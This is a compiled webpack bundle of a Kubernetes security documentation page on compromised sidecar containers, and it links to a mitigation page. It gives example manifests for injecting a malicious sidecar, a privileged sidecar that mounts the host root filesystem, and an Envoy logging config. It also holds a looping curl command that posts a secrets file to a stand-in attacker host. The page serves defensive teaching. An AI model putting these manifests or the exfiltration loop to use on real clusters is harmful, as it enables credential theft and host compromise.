"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[3758],{708:(e,i,s)=>{s.r(i),s.d(i,{assets:()=>o,contentTitle:()=>c,default:()=>p,frontMatter:()=>r,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/compromised_sidecars","title":"Compromised Sidecars","description":"How attackers exploit insecure or malicious sidecar containers to intercept data, escalate privileges, and persist within Kubernetes clusters.","source":"@site/docs/attack_vectors/compromised_sidecars.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/compromised_sidecars","permalink":"/docs/attack_vectors/compromised_sidecars","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742774115000,"sidebarPosition":14,"frontMatter":{"sidebar_position":14,"title":"Compromised Sidecars","description":"How attackers exploit insecure or malicious sidecar containers to intercept data, escalate privileges, and persist within Kubernetes clusters."},"sidebar":"default","previous":{"title":"Privileged Service Accounts","permalink":"/docs/attack_vectors/privileged_service_accounts"},"next":{"title":"Introduction","permalink":"/docs/best_practices/intro"}}');var t=s(4848),a=s(8453);const r={sidebar_position:14,title:"Compromised Sidecars",description:"How attackers exploit insecure or malicious sidecar containers to intercept data, escalate privileges, and persist within Kubernetes clusters."},c="Compromised Sidecars",o={},l=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Deploy a Malicious Sidecar",id:"1-deploy-a-malicious-sidecar",level:3},{value:"2. Intercept and Modify Traffic",id:"2-intercept-and-modify-traffic",level:3},{value:"3. Abuse Privileged Sidecars for Host Access",id:"3-abuse-privileged-sidecars-for-host-access",level:3},{value:"4. Persist Within the Cluster",id:"4-persist-within-the-cluster",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function d(e){const i={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(i.header,{children:(0,t.jsx)(i.h1,{id:"compromised-sidecars",children:"Compromised Sidecars"})}),"\n",(0,t.jsxs)(i.p,{children:["Sidecar containers in Kubernetes extend the functionality of application containers by handling logging, monitoring, proxies, or other supporting services. However, if sidecars are ",(0,t.jsx)(i.strong,{children:"misconfigured, maliciously injected, or overly privileged"}),", they can be exploited to intercept sensitive data, gain elevated access, or maintain long-term persistence in the cluster."]}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,t.jsx)(i.h3,{id:"1-deploy-a-malicious-sidecar",children:"1. Deploy a Malicious Sidecar"}),"\n",(0,t.jsx)(i.p,{children:"If an attacker gains control over a Pod specification (e.g., through CI/CD poisoning or RBAC misconfig), they can inject a malicious sidecar:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-yaml",children:"apiVersion: v1\nkind: Pod\nmetadata:\n  name: attacker-sidecar\nspec:\n  containers:\n    - name: legitimate-app\n      image: secure-app:latest\n    - name: malicious-sidecar\n      image: attacker/spy-container\n      volumeMounts:\n        - mountPath: /app-data\n          name: shared-volume\n  volumes:\n    - name: shared-volume\n      emptyDir: {}\n"})}),"\n",(0,t.jsx)(i.p,{children:"This sidecar has access to the app\u2019s volume and can exfiltrate credentials, logs, or sensitive files."}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h3,{id:"2-intercept-and-modify-traffic",children:"2. Intercept and Modify Traffic"}),"\n",(0,t.jsx)(i.p,{children:"Service mesh sidecars like Envoy can be abused to log or alter traffic. For example, a misconfigured Envoy sidecar might write incoming requests to a local file:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-yaml",children:'admin:\n  access_log_path: "/dev/stdout"\n  profile_path: "/var/lib/envoy/profile"\nstatic_resources:\n  listeners:\n    - address: "0.0.0.0"\n      filter_chains:\n        - filters:\n            - name: "envoy.http_connection_manager"\n              config:\n                codec_type: "AUTO"\n                access_log:\n                  - name: "envoy.file_access_log"\n                    config:\n                      path: "/data/logs/requests.log"\n'})}),"\n",(0,t.jsx)(i.p,{children:"These logs could include JWT tokens, user credentials, and sensitive application data."}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h3,{id:"3-abuse-privileged-sidecars-for-host-access",children:"3. Abuse Privileged Sidecars for Host Access"}),"\n",(0,t.jsxs)(i.p,{children:["When a sidecar container is deployed with ",(0,t.jsx)(i.code,{children:"privileged: true"})," and mounted to the host, the attacker can interact with the node:"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-yaml",children:"apiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-sidecar\nspec:\n  containers:\n    - name: main-app\n      image: secure-app\n    - name: sidecar\n      image: attacker/root-access\n      securityContext:\n        privileged: true\n      volumeMounts:\n        - mountPath: /host\n          name: host-volume\n  volumes:\n    - name: host-volume\n      hostPath:\n        path: /\n        type: Directory\n"})}),"\n",(0,t.jsx)(i.p,{children:"Then:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"kubectl exec -it privileged-sidecar -- /bin/sh\nls /host/etc/\n"})}),"\n",(0,t.jsx)(i.p,{children:"The sidecar can access host files, potentially leading to full node compromise."}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h3,{id:"4-persist-within-the-cluster",children:"4. Persist Within the Cluster"}),"\n",(0,t.jsx)(i.p,{children:"Even if the main container is removed, a malicious sidecar may remain active. It can:"}),"\n",(0,t.jsxs)(i.ul,{children:["\n",(0,t.jsxs)(i.li,{children:["Serve as a ",(0,t.jsx)(i.strong,{children:"reverse shell"})]}),"\n",(0,t.jsx)(i.li,{children:"Forward traffic to a C2 server"}),"\n",(0,t.jsxs)(i.li,{children:["Periodically ",(0,t.jsx)(i.strong,{children:"exfiltrate secrets"})]}),"\n"]}),"\n",(0,t.jsx)(i.p,{children:"Example:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"while true; do cat /data/secrets.txt | curl -X POST -d @- http://attacker-server.com/upload; sleep 60; done\n"})}),"\n",(0,t.jsx)(i.p,{children:"Such persistence allows long-term access even after incident response cleans up the primary application."}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h3,{id:"result",children:"Result"}),"\n",(0,t.jsx)(i.p,{children:"A compromised or malicious sidecar enables the attacker to:"}),"\n",(0,t.jsxs)(i.ul,{children:["\n",(0,t.jsx)(i.li,{children:"Intercept and modify sensitive traffic"}),"\n",(0,t.jsx)(i.li,{children:"Steal secrets and credentials"}),"\n",(0,t.jsx)(i.li,{children:"Escalate to the host"}),"\n",(0,t.jsx)(i.li,{children:"Maintain stealthy persistence in the cluster"}),"\n"]}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,t.jsxs)(i.p,{children:["\u27a1 ",(0,t.jsx)(i.a,{href:"/docs/best_practices/cluster_setup_and_hardening/pod_security/compromised_sidecars_mitigation",children:"Securing Kubernetes Sidecars"})]})]})}function p(e={}){const{wrapper:i}={...(0,a.R)(),...e.components};return i?(0,t.jsx)(i,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,i,s)=>{s.d(i,{R:()=>r,x:()=>c});var n=s(6540);const t={},a=n.createContext(t);function r(e){const i=n.useContext(a);return n.useMemo((function(){return"function"==typeof e?e(i):{...i,...e}}),[i,e])}function c(e){let i;return i=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),n.createElement(a.Provider,{value:i},e.children)}}}]);